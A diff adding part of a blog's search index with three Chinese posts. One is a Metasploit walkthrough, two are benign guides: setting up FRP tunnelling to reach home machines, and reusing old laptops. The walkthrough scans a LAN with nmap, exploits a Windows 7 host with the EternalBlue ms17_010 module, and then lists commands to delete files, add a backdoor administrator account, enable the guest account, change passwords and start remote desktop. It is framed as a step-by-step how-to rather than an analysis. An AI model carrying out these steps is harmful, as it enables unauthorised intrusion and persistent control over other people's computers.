+        <content type="html"><![CDATA[<p><strong>前提说明</strong></p><p>1.在同个局域网内<br>2.准备纯净系统的win7系统电脑一台<br>3.准备kali系统一台<br>4.我的操作均是在虚拟机上完成，可能在物理机上效果会有所不同。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><a id="more"></a><h3 id="第一步：-扫描局域网内存活的主机："><a href="#第一步：-扫描局域网内存活的主机：" class="headerlink" title="第一步： 扫描局域网内存活的主机："></a>第一步： 扫描局域网内存活的主机：</h3><p><code>nmap -sP 192.168.1.0/24</code> （扫描较快）<br>也可以直接用这条命令来扫描：<br><code>nmap -sS -sV -Pn 192.168.1.0/24</code>  （扫描较慢）<br>nmap还有很多扫描用法，请自行查询。</p><h3 id="第二步：扫描要攻击的主机："><a href="#第二步：扫描要攻击的主机：" class="headerlink" title="第二步：扫描要攻击的主机："></a>第二步：扫描要攻击的主机：</h3><p><code>nmap -sS -sV -Pn 192.168.1.111</code>（例如目标主机是192.168.1.111）</p><h3 id="第三步：Kali终端输入msfconsole-或者手动点击软件图标"><a href="#第三步：Kali终端输入msfconsole-或者手动点击软件图标" class="headerlink" title="第三步：Kali终端输入msfconsole 或者手动点击软件图标"></a>第三步：Kali终端输入msfconsole 或者手动点击软件图标</h3><h3 id="第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010"><a href="#第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010" class="headerlink" title="第四步：先使用use auxiliary/scanner/smb/smb_ms17_010"></a>第四步：先使用<code>use auxiliary/scanner/smb/smb_ms17_010</code></h3><p>利用ms17_010这个漏洞入侵<br>紧接着输入show options这个模块进行漏洞的分析，看看这个445端口是否能被入侵。</p><h3 id="第五步：使用攻击模块："><a href="#第五步：使用攻击模块：" class="headerlink" title="第五步：使用攻击模块："></a>第五步：使用攻击模块：</h3><pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>输入show targets查看这个模块适用于哪些系统的主机</p><h3 id="第六步：设置RHOST，即要攻击的主机ip："><a href="#第六步：设置RHOST，即要攻击的主机ip：" class="headerlink" title="第六步：设置RHOST，即要攻击的主机ip："></a>第六步：设置RHOST，即要攻击的主机ip：</h3><pre><code>set RHOST 192.168.0.111</code></pre><h3 id="第七步：执行run"><a href="#第七步：执行run" class="headerlink" title="第七步：执行run"></a>第七步：执行<code>run</code></h3><p>如果电脑存在上面的那个漏洞的话，这一步就可以进去了<br>如果等了一会还没显示进去的话，就按下回车键。</p><p>备注：进去之后会看到乱码，因为cmd上的编码使用的是936，通过 chcp命令改变代码页，UTF-8的代码页为65001 。要改回linux的UTF-8编码：chcp 65001</p><p>MS-DOS为以下国家和语言提供字符集：<br>　　代码页描述<br>　　1258 越南语<br>　　1257 波罗的语<br>　　1256 阿拉伯语<br>　　1255 希伯来语<br>　　1254 土耳其语<br>　　1253 希腊语<br>　　1252 拉丁 1 字符 (ANSI)<br>　　1251 西里尔语<br>　　1250 中欧语言<br>　　950 繁体中文<br>　　949 朝鲜语<br>　　936 简体中文（默认）<br>　　932 日语<br>　　874 泰国语<br>　　850 多语种 (MS-DOS Latin1)<br>　　437 MS-DOS 美国英语 </p><p>还有一个解决方法，如果想显示中文的话，就将kali终端的编码改为“简体中文-GBK”</p><h3 id="第八步：执行想要操作的指令"><a href="#第八步：执行想要操作的指令" class="headerlink" title="第八步：执行想要操作的指令"></a>第八步：执行想要操作的指令</h3><p>删除文件夹：rmdir 目标文件夹<br>删除文件：del<br>创建文件夹：md 文件夹<br>查看目标的磁盘信息：wmic logicaldisk<br>查看系统信息：systeminfo<br>创建一个用户：net user test 123456 /add<br>将创建的test用户赋予管理员权限：net localgroup administrator test /add<br>查看有哪些用户：net user<br>查看账户的属性：net user test<br>立刻关机：shutdown /s/f   #会提示没有权限<br>net user guest /active:yes 激活guest用户<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>net start 查看开启了哪些服务<br>net start 服务名　开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net user admin /active:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>tive:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>net start termservice termservice 是远程桌面服务<br>net user 用户名 复杂密码 /add   添加用户<br>net localgroup administrators 用户名 /add   将用户加入管理员组</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>使用FRP做内网穿透</title>
+      <link href="/2019/11/10/%E4%BD%BF%E7%94%A8FRP%E5%81%9A%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%95%99%E7%A8%8B/"/>
+      <url>/2019/11/10/%E4%BD%BF%E7%94%A8FRP%E5%81%9A%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%95%99%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<p><strong>为什么要做内网穿透？</strong><br>普通家庭里使用的都是局域网，比如说你家在A，然后你工作的地方在B，然后你突然间想远程家里A的电脑，这时候是不能在B的网络里直接远程到A的电脑上，因为不是在同个局域网内，虽然我们可以借助第三方软件来实现远程的功能，但还是存在一些不方便，第三方软件对桌面系统很友好，例如Windows系统，ubuntu桌面，或者deepin桌面系统，这些都会有开发好的图形化的远程软件来支持。但是对命令界面的操作系统就很不友好了，我家里放的一台笔记本是装了命令界面的centos7系统。安装那些远程软件是一个问题，配置是一个问题，让很多人操碎了心，这时候制作一个内网穿透的功能就显得有一定的作用了，简而言之，有了内网穿透功能，我们就可以随时随地的远程回家的电脑了。</p><a id="more"></a><h3 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h3><p>这些教程是我通过在网上学来的，然后通过自己实践并总结做出来的笔记。</p><p>首先要有一个云服务器（VPS服务器）在亚马逊、阿里云、微软云等等都可以。</p><p>在云服务器上安装FRP服务端<br>有两种方法：</p><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><pre><code class="bash">export FRP_VERSION=0.29.1sudo mkdir -p /etc/frpcd /etc/frpsudo wget &quot;https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz&quot;sudo tar xzvf frp_${FRP_VERSION}_linux_amd64.tar.gzsudo mv frp_${FRP_VERSION}_linux_amd64/* /etc/frp</code></pre><h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><pre><code class="x86asm">sudo wget https://github.com/fatedier/frp/releases/download/v0.29.1/frp_0.29.1_linux_amd64.tar.gztar xzvf frp_0.29.1_linux_amd64.tar.gzmv frp_0.29.1_linux_amd64 frp</code></pre><p>如果是windows系统则去平台下载对应的包：<br>更多平台的软件包下载地址：<a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a></p><p>防火土啬和安全组开放指定的端口：<br>请一定要记住，你需要将服务器的系统防火土啬，以及阿里云、腾讯云后台里找到“安全组策略”的相关配置，设置 7000 或你修改过的对应端口的「允许入站和出站」，否则会一直连接不上的哦！！！这个切记！！</p><h5 id="启动-FRP-服务端"><a href="#启动-FRP-服务端" class="headerlink" title="启动 FRP 服务端"></a>启动 FRP 服务端</h5><p><code>./frps -c ./frps.ini</code>   （不推荐这样的启动）这样退出启动控制台程序便中断了。于是我们通常选择后台启动。在linux中使用如下命令进行后台启动。然后运行的日志会输出到当前目录的nohup.log文件中<br><code>nohup ./frps -c frps.ini &amp;</code>     （推荐）<br>可以使用 <em>ps -ef | grep frps</em>   查看程序是否在运行。</p><p>如服务器使用 Win 系统，假设解压到 c:\frp 文件夹，那么只需这样启动：</p><pre><code class="tex">c:\frp\frps.exe -c c:\frp\frps.exe</code></pre><h5 id="配置-Frp-客户端-安装在内网的机器上-："><a href="#配置-Frp-客户端-安装在内网的机器上-：" class="headerlink" title="配置 Frp 客户端 (安装在内网的机器上)："></a>配置 Frp 客户端 (安装在内网的机器上)：</h5><p>Linux系统跟上面的安装一样，Windows系统去平台下载。</p><pre><code class="makefile">vim /etc/frp/frpc.ini[common]server_addr = 52.231.111.111     #公网ipserver_port = 7000                 #公网端口 需要在云服务器的管理后台开放此端口。[ssh]type = tcplocal_ip = 192.168.2.138          #内网iplocal_port = 22remote_port = 6000               #内网端口 需要在云服务器的管理后台开放此端口。[DSM]type = tcplocal_ip = 192.168.1.40 #群晖 NAS 在局域网中的内网 IPlocal_port = 5000remote_port = 7001[RDP]type = tcplocal_ip = 192.168.1.30 #电脑在局域网中的内网 IP (如是本机，也可使用 127.0.0.1)local_port = 3389remote_port = 7002</code></pre><p>[common]表示以下配置信息是一些公用配置信息<br>server_addr是我们服务端即外网服务器的公网访问ip<br>server_port是我们前面在服务端配置的frps.ini中bind_port中对应的端口。需保持两边一致<br>[ssh]表示以下配置信息是我们使用ssh连接内网服务器时需要的一些配置信息<br>type 是连接类型，ssh方式连接就用tcp<br>local_ip 是本机ip,直接使用127.0.0.1即可<br>local_port 是本地ssh端口，ssh默认端口为22<br>remote_port 是外网服务器请求过来的端口 注：阿里云服务器需要在esc管理中配置安全组规则中添加6000端口</p><h5 id="启动-FRP-客户端："><a href="#启动-FRP-客户端：" class="headerlink" title="启动 FRP 客户端："></a>启动 FRP 客户端：</h5><p>假设你已将 Frp 的客户端解压缩到 c:\frp 目录中，那么启动 Frp 客户端的命令就是：</p><pre><code class="tex">c:\frp\frpc.exe -c c:\frp\frpc.ini</code></pre><p>Linux 启动 Frp 客户端命令：</p><pre><code class="jboss-cli">nohup ./frpc -c ./frpc.ini &amp;</code></pre><p>启动之后看到 “start proxy success”字样就表示启动成功了。</p><p>进行远程访问：</p><p>前面搞了这么多，我们终于可以正式使用 Frp 内网穿透来进行远程访问内网里的设备了！按照上面的配置，我们想要访问群晖 NAS 的界面，只需打开浏览器，在地址栏输入 服务器公网IP:7001 即可访问到群晖后台管理界面。</p><p>而如果需要远程桌面连接到家里的 Windows 电脑，那么打开“微软远程桌面客户端”后，在地址栏里填入 服务器公网IP:7002 即可连接。</p><h5 id="远程linux客户端："><a href="#远程linux客户端：" class="headerlink" title="远程linux客户端："></a>远程linux客户端：</h5><pre><code class="nginx">ssh root@52.231.111.111:6000</code></pre><p>由此，借助 Frp，你就能轻松地为本地局域网内网的设备提供公网直接访问的能力了，你可以用 Frp 来转发包括但不限于 ssh、http、https、转发 Unix 域套接字等服务。</p><p>上面只是最基础的教程，Frp 还有很多很多高级功能，比如给 Web 增加密码保护、点对点内网穿透、设置端口白名单等等，Frp 官网上也提供了很详细的文档，感兴趣的朋友可以去研究一下。</p><h5 id="外网服务器HTTP配置"><a href="#外网服务器HTTP配置" class="headerlink" title="外网服务器HTTP配置"></a>外网服务器HTTP配置</h5><p>通常我们在开发的时候想让别人通过外网可以直接访问到我们的系统，以便于调试和测试，我是在做微信开发的时候需要使用到内网穿透的http服务，于是我们需要在frp中添加http服务的内网穿透配置</p><p>在外网服务器的frps.ini中添加http服务配置如下：</p><pre><code class="ini">[common]bind_port = 7000vhost_http_port = 6001</code></pre><p>bind_port和之前做ssh时是一个意思。也是为了和客户端建立通信的端口，只需要在之前的配置文件中添加上vhost_http_port = 6001,这个配置意思是让别人在访问我们的服务器6001端口时。frp将http请求转发到内网服务器</p><p>服务端的http请求配置到这里就结束了</p><h5 id="内网服务器HTTP配置"><a href="#内网服务器HTTP配置" class="headerlink" title="内网服务器HTTP配置"></a>内网服务器HTTP配置</h5><p>内网服务器需要在frpc.ini中添加上如下内容：</p><pre><code class="ini">[web]type = httplocal_port = 80custom_domains = wannabe.fun</code></pre><p>[web]表示我们的配置是一个web服务<br>type表示我们的请求方式是http方式<br>local_port表示我们的本地服务端口号为80<br>custom_domains表示配置为一个已经备案的域名(必填,并且需要域名可用，开始我认为这个不是必须的，于是花了很长时间，)，并且域名解析配置为外网服务器ip</p><p>以上配置完成后，我们就可以使用wannabe.fun:6001访问到我们部署在内网服务器的80端口的服务了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>家里旧电脑的处理</title>
+      <link href="/2019/11/07/%E5%AE%B6%E9%87%8C%E6%97%A7%E7%94%B5%E8%84%91%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+      <url>/2019/11/07/%E5%AE%B6%E9%87%8C%E6%97%A7%E7%94%B5%E8%84%91%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p><strong>概要</strong></p><p>随着电脑的更新换代，现在很多电脑都被换下成为放灰尘的电子垃圾了。我家里就放了两台五年前买的笔记本（一台华硕4G+500G，一台戴尔8G+500G），家里的父母又不用，平时就放在桌子上放灰了，现在我要将它们跑起来，让它们好发挥出电脑的最后一点的尊严。</p><a id="more"></a><h3 id="第一步：换系统或换硬盘"><a href="#第一步：换系统或换硬盘" class="headerlink" title="第一步：换系统或换硬盘"></a>第一步：换系统或换硬盘</h3><p>两台笔记本都是老电脑，用起来是比较卡的了，受限于硬件的老化以及硬件瓶颈，注定它们的速度是不能很给力的了。两个方法可以改善这个问题，一是换系统，二是换硬盘。我用华硕的笔记本装了centos7 linux系统，Linux系统是比较不吃硬件的，并且我装的是指令界面的centos7，就是没有图形界面的。这样一来，这台老电脑就可以跑的很顺畅了。另外一台戴尔笔记本因体质好点，我就给它换了一个sata3 的固态硬盘(120G)，这样它的速度一下子就提升了很多倍，因考虑到远程电脑之类的问题，我就给它安装了全新的win7旗舰版系统，如果装win10的话就会卡，毕竟是老机子了。</p><h3 id="第二步：系统配置优化"><a href="#第二步：系统配置优化" class="headerlink" title="第二步：系统配置优化"></a>第二步：系统配置优化</h3><p>那么这样一来，它们就成了两台运行流畅的电脑了，我是计划将centos做成服务器，而win7即成为我远程控制的主机，我可以通过控制win7来控制centos服务器，与此同时，如果家里人需要用电脑的话，还可以使用win7。那么接下来我就要对它们进行一下系统配置。<br>对win7配置，直接上图<br><img src="https://img-blog.csdnimg.cn/20191109124326759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>图片中的这些软件都是通过精挑细选后安装的，每个软件都有它的作用，这里就不一 一解释了。有了这些软件我就可以轻松的远程到家里的win7系统上面了。</p><p>对centos做如下处理：搭建vsftp系统，搭建web系统 。搭建FTP是为了将华硕电脑内的500G硬盘共享出来两台电脑一起用，毕竟戴尔电脑的硬盘才有120G，这样一来就可以解决戴尔电脑的硬盘容量低的问题。搭建web系统是因为我要搭建自己的个人网站。当然了，centos系统能够搭建的服务系统还有很多，我就不一 一列举了。<br>共享硬盘的界面如下：<br><img src="https://img-blog.csdnimg.cn/2019110912440254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是我自己搭建的个人网站:<a href="http://s2j3510639.iok.la/" target="_blank" rel="noopener">http://s2j3510639.iok.la/</a>用的是花生壳做的内网穿透，好久没有更新了,我现在用的是另外一个我的个人网站:<a href="https://caijinbo.work/">https://caijinbo.work/</a><br><img src="https://img-blog.csdnimg.cn/20191109125144971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>在win7上安装TeamViewer或者向日葵，在这里要对teamviewer设置个人密码，后期远程才会方便些。<br>在centos上要安装并开启ssh服务，我喜欢用xshell来远程centos系统，传输文件喜欢用WinSCP软件。</p><p>第四步：总结</p><p><img src="https://img-blog.csdnimg.cn/2019110912522280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>做完上面这些之后，我就可以随时远程回家，查看家里的网络情况，还可以通过家里的电脑视频通话，还可以开摄像头看看家里的样子，想看更多地方的话可以提前布置好外接摄像头的位置。我本来是想安装监控摄像头的，直接通过电脑的外接摄像头和监控摄像软件来配合完成，结果因为没找到满意的录像软件，这个想法就一直被搁置了。有时候家里人的手机有问题，我还可以通过让他们将手机连上电脑，然后我通过远程电脑来控制管理手机。有时候远程家里的电脑感觉有一种已经回家的感觉。总之，这样可以让两台老旧电脑发挥最后一点价值，当然，电脑的功能很强大，后期我还会继续添加功能的。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
